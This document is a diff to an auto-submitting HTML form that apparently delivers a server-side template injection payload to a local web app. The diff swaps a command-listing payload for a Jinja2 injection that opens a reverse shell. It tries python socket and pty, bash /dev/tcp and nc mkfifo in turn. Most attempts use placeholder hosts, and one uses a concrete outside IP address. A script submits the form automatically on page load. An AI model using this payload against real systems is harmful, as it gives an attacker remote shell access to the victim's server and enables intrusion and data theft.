@@ -1,5 +1,5 @@
 <form method="POST" action="http://127.0.0.1:4000/">
-       <input type="hidden" name="comment" value='{{ config.from_pyfile.__globals__["os"].popen("ls -la").read() }}'>
+       <input type="hidden" name="comment" value='{{ url_for.__globals__["__builtins__"].__import__("subprocess").Popen("bash -lc \"command -v python3 &gt;/dev/null 2&gt;&amp;1 &amp;&amp; python3 -c '\''import socket,os,pty;s=socket.socket();s.connect((\"LHOST\",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'\'' || command -v python &gt;/dev/null 2&gt;&amp;1 &amp;&amp; python -c '\''import socket,os,pty;s=socket.socket();s.connect((\"34.244.0.254\",2000));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'\'' || command -v bash &gt;/dev/null 2&gt;&amp;1 &amp;&amp; bash -c '\''bash -i &gt;&amp; /dev/tcp/LHOST/LPORT 0&gt;&amp;1'\'' || command -v nc &gt;/dev/null 2&gt;&amp;1 &amp;&amp; bash -c '\''rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc LHOST LPORT &gt;/tmp/f'\''\"", shell=True) }}'>
 </form>
 <script>
         document.querySelector("form").submit();
